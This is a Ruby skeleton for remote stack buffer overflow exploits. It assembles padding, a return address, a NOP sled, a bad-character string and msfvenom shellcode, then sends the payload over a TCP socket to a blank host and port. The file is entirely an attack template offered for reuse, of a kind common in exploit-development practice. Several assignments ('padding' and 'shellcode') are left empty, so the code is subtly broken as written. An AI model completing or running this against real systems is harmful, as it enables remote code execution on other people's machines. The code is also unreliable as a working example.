# Ruby Skeleton Code For Buffer Overflow Attacks , Twitter @BypassASLR

require 'socket' 

host = ""
port = 0

buffer = "A" 

offset = 0

overflow = buffer * offset

retn = "" 

eip = "" # The EIP / Return Address 

padding =  # NOPs , at least 16 example : "\x90" * 16

badchars = "" # the bad characters , you can find it here https://github.com/cytopia/badchars
 
shellcode = # the msfvenom shell code that you generated   

payload = overflow + retn + eip + padding + badchars + shellcode

payload += "\r\n"


begin
  
  s = TCPSocket.open(host, port)

  s.send(payload, 0)

  puts " Sending Exploit #{payload.size} bytes "

  s.recv(1024)

  s.close()


rescue Errno::ECONNREFUSED
  puts "Target Offline"
  exit!

rescue Errno::ECONNRESET
  puts "Target Crashed or Offline"
  exit!
end
 
